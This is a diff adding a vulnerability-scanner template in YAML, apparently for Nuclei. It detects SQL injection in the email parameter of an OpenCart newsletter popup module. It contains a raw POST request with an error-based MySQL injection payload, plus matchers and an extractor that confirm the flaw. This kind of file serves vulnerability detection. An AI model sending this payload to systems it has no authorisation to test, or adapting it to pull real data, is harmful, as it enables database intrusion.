@@ -1,0 +1,37 @@
+id: opencart-so-newsletter-sqli
+info:
+  name: OpenCart So Newsletter Custom Popup SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The OpenCart Newsletter Custom Popup module is vulnerable to SQL injection in
+    the email parameter of the `extension/module/so_newletter_custom_popup/newsletter`
+    interface due to improper input filtering.
+  reference:
+    - https://packetstormsecurity.com/files/168412/OpenCart-3.x-Newsletter-Custom-Popup-4.0-SQL-Injection.html
+    - https://www.opencart.com/index.php?route=marketplace/extension/info&extension_id=40259&filter_search=newsletter&filter_license=1&sort=date_added
+  classification:
+    cvss-score: 7.5
+  tags: sqli
+http:
+  - raw:
+      - |
+        POST /index.php?route=extension/module/so_newletter_custom_popup/newsletter HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        createdate=2022-8-28 19:4:6&email=hi' AND (SELECT 4828 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT md5(0x5c)),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#&status=0
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "28d397e87306b8631f3ed80d858d35f0"
+        part: body
+    extractors:
+      - type: regex
+        regex:
+          - "~(.*?)~"
+        group: 1
